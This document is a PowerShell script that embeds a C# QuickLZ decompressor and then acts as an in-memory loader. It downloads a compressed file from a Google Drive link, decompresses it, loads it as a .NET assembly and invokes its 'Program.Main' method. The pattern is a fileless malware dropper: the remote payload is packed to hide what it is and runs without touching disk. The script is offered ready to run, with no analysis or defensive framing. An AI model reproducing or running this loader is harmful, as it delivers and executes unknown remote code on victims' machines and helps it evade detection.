Add-type -Assembly System.Drawing
Add-Type -Assembly System.Windows.Forms
Add-Type -Assembly PresentationCore
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
Add-Type -TypeDefinition @"
#pragma warning disable 0675
using System;
namespace gs
{
    public static class SafeQuickLZ
    {
        public const int QLZ_VERSION_MAJOR = 1;
        public const int QLZ_VERSION_MINOR = 5;
        public const int QLZ_VERSION_REVISION = 0;       
        public const int QLZ_STREAMING_BUFFER = 0;        
        public const int QLZ_MEMORY_SAFE = 0;        
        private const int HASH_VALUES = 4096;
        private const int MINOFFSET = 2;
        private const int UNCONDITIONAL_MATCHLEN = 6;
        private const int UNCOMPRESSED_END = 4;
        private const int CWORD_LEN = 4;
        private const int DEFAULT_HEADERLEN = 9;
        private const int QLZ_POINTERS_1 = 1;
        private const int QLZ_POINTERS_3 = 16;

        public static int HeaderLength(byte[] source)
        {
            return ((source[0] & 2) == 2) ? 9 : 3;
        }

        public static int SizeDecompressed(byte[] source)
        {
            if (HeaderLength(source) == 9)
                return source[5] | (source[6] << 8) | (source[7] << 16) | (source[8] << 24);
            else
                return source[2];
        }   
		
        public static byte[] Decompress(byte[] source)
        {
            if (source.Length == 0)
                return new byte[0];

            int level = (source[0] >> 2) & 0x3;

            if (level != 1 && level != 3)
                //throw new ArgumentException("C# version only supports level 1 and 3");
                throw new ArgumentException("");

            int size = SizeDecompressed(source);
            int src = HeaderLength(source);
            int dst = 0;
            uint cword_val = 1;
            byte[] destination = new byte[size];
            int[] hashtable = new int[4096];
            byte[] hash_counter = new byte[4096];
            int last_matchstart = size - UNCONDITIONAL_MATCHLEN - UNCOMPRESSED_END - 1;
            int last_hashed = -1;
            int hash;
            uint fetch = 0;

            if ((source[0] & 1) != 1)
            {
                byte[] d2 = new byte[size];
                Array.Copy(source, HeaderLength(source), d2, 0, size);
                return d2;
            }

            for (; ; )
            {
                if (cword_val == 1)
                {
                    cword_val =
                        (uint)
                            (source[src] | (source[src + 1] << 8) | (source[src + 2] << 16) | (source[src + 3] << 24));
                    src += 4;
                    if (dst <= last_matchstart)
                    {
                        if (level == 1)
                            fetch = (uint)(source[src] | (source[src + 1] << 8) | (source[src + 2] << 16));
                        else
                            fetch =
                                (uint)
                                    (source[src] | (source[src + 1] << 8) | (source[src + 2] << 16) |
                                        (source[src + 3] << 24));
                    }
                }

                if ((cword_val & 1) == 1)
                {
                    uint matchlen;
                    uint offset2;

                    cword_val = cword_val >> 1;

                    if (level == 1)
                    {
                        hash = ((int)fetch >> 4) & 0xfff;
                        offset2 = (uint)hashtable[hash];

                        if ((fetch & 0xf) != 0)
                        {
                            matchlen = (fetch & 0xf) + 2;
                            src += 2;
                        }
                        else
                        {
                            matchlen = source[src + 2];
                            src += 3;
                        }
                    }
                    else
                    {
                        uint offset;
                        if ((fetch & 3) == 0)
                        {
                            offset = (fetch & 0xff) >> 2;
                            matchlen = 3;
                            src++;
                        }
                        else if ((fetch & 2) == 0)
                        {
                            offset = (fetch & 0xffff) >> 2;
                            matchlen = 3;
                            src += 2;
                        }
                        else if ((fetch & 1) == 0)
                        {
                            offset = (fetch & 0xffff) >> 6;
                            matchlen = ((fetch >> 2) & 15) + 3;
                            src += 2;
                        }
                        else if ((fetch & 127) != 3)
                        {
                            offset = (fetch >> 7) & 0x1ffff;
                            matchlen = ((fetch >> 2) & 0x1f) + 2;
                            src += 3;
                        }
                        else
                        {
                            offset = (fetch >> 15);
                            matchlen = ((fetch >> 7) & 255) + 3;
                            src += 4;
                        }
                        offset2 = (uint)(dst - offset);
                    }

                    destination[dst + 0] = destination[offset2 + 0];
                    destination[dst + 1] = destination[offset2 + 1];
                    destination[dst + 2] = destination[offset2 + 2];

                    for (int i = 3; i < matchlen; i += 1)
                    {
                        destination[dst + i] = destination[offset2 + i];
                    }

                    dst += (int)matchlen;

                    if (level == 1)
                    {
                        fetch =
                            (uint)
                                (destination[last_hashed + 1] | (destination[last_hashed + 2] << 8) |
                                    (destination[last_hashed + 3] << 16));
                        while (last_hashed < dst - matchlen)
                        {
                            last_hashed++;
                            hash = (int)(((fetch >> 12) ^ fetch) & (HASH_VALUES - 1));
                            hashtable[hash] = last_hashed;
                            hash_counter[hash] = 1;
                            fetch = (uint)(fetch >> 8 & 0xffff | destination[last_hashed + 3] << 16);
                        }
                        fetch = (uint)(source[src] | (source[src + 1] << 8) | (source[src + 2] << 16));
                    }
                    else
                    {
                        fetch =
                            (uint)
                                (source[src] | (source[src + 1] << 8) | (source[src + 2] << 16) |
                                    (source[src + 3] << 24));
                    }
                    last_hashed = dst - 1;
                }
                else
                {
                    if (dst <= last_matchstart)
                    {
                        destination[dst] = source[src];
                        dst += 1;
                        src += 1;
                        cword_val = cword_val >> 1;

                        if (level == 1)
                        {
                            while (last_hashed < dst - 3)
                            {
                                last_hashed++;
                                int fetch2 = destination[last_hashed] | (destination[last_hashed + 1] << 8) |
                                                (destination[last_hashed + 2] << 16);
                                hash = ((fetch2 >> 12) ^ fetch2) & (HASH_VALUES - 1);
                                hashtable[hash] = last_hashed;
                                hash_counter[hash] = 1;
                            }
                            fetch = (uint)(fetch >> 8 & 0xffff | source[src + 2] << 16);
                        }
                        else
                        {
                            fetch = (uint)(fetch >> 8 & 0xffff | source[src + 2] << 16 | source[src + 3] << 24);
                        }
                    }
                    else
                    {
                        while (dst <= size - 1)
                        {
                            if (cword_val == 1)
                            {
                                src += CWORD_LEN;
                                cword_val = 0x80000000;
                            }

                            destination[dst] = source[src];
                            dst++;
                            src++;
                            cword_val = cword_val >> 1;
                        }
                        return destination;
                    }
                }
            }
        }
    }
}
"@ -ReferencedAssemblies System.Windows.Forms
$name = "Main";
$URI = "https://drive.google.com/uc?export=download&id=1GUfzCH1FsSSQZ_Xf8HwOLgqhsygBTnK9&confirm=t"
$Response=Invoke-WebRequest -Method GET -Uri $URI -UseBasicParsing
[byte[]]$bytes = $Response.content
$length = $bytes.Length
write-host $length
$decompress_bytes = [gs.SafeQuickLZ]::Decompress($bytes)
$assembly = [System.Reflection.Assembly]::Load($decompress_bytes)
foreach ($type in $assembly.GetTypes())
{
	write-host $type.Name.ToLower()
	if(($type.Name.ToLower()).equals("program"))
	{
		foreach ($method in $type.GetMethods())
		{
			write-host $method.Name.ToLower()
			if (($method.Name.ToLower()).equals($name.ToLower()))
			{
				$instance = [System.Activator]::CreateInstance($type)
				$method.Invoke($instance, @())				
			}
		}
	}
}